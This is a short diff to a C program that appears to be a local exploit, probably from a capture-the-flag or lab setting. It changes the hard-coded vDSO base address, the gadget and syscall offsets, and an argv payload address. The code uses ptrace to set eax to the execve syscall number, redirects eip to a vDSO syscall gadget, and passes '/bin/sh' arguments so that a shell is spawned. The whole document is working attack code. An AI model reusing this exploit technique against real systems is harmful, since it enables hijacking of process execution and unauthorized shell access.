@@ -5,7 +5,7 @@
 #include <sys/user.h>
 #include <sys/wait.h>
 
-// vdso_base = 0x55557000       # 0xf77af000
+// vdso_base = 0x55557000       # 0x55655000
 // gadget = vdso_base + 0xb08   # 0xc3c
 // syscall = vdso_base + 0xb90  # 0xc90
 
@@ -13,9 +13,9 @@ int main(){
     int status = 0;
     int pid, i;
     struct user_regs_struct regs;
-	unsigned long vdso_base = 0x55557000;
+	unsigned long vdso_base = 0x55655000;
 
-    char *argv[27] = {"\x08\x7b\x55\x55", NULL};
+    char *argv[27] = {"\x3c\x5c\x65\x55", NULL};
 
     for(i = 1; i < 26; i++){
         argv[i] = "/bin/sh";
@@ -45,7 +45,7 @@ int main(){
             printf("ebp: 0x%08x\n", (unsigned int)regs.ebp);
 
             regs.eax = 0xb;
-            regs.eip = vdso_base + 0xb90;
+            regs.eip = vdso_base + 0xc90;
 
             ptrace(PTRACE_SETREGS, pid, 0, &regs);
             ptrace(PTRACE_DETACH, pid ,0, 0);
